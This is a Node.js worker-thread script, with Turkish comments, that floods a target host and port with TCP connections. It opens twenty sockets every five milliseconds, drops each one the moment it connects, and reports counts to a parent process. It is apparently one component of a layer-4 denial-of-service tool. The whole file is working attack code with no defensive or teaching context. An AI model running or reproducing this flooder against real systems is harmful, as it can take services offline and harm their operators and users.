const { parentPort, workerData } = require('worker_threads');
const net = require('net');

const { target, port, duration } = workerData;
let localStats = { sent: 0, success: 0, failed: 0, bytes: 0 };
let active = true;

setInterval(() => {
    if (active) parentPort.postMessage({ type: 'stats', data: localStats });
}, 500);

function sendTCP() {
    if (!active) return;

    const client = new net.Socket();
    client.setTimeout(2000);

    client.connect(port, target, () => {
        localStats.sent++;
        localStats.success++;
        client.destroy(); // Bağlantı başarılı olduğu an soketi yırtıp yenisini açıyoruz
    });

    client.on('error', () => {
        localStats.sent++;
        localStats.failed++;
        client.destroy();
    });

    client.on('timeout', () => {
        localStats.failed++;
        client.destroy();
    });
}

// L4 operasyonları asenkron döngüde olabildiğince hızlı döner
const loop = setInterval(() => {
    for (let i = 0; i < 20; i++) {
        sendTCP();
    }
}, 5);

setTimeout(() => {
    active = false;
    clearInterval(loop);
    process.exit(0);
}, duration);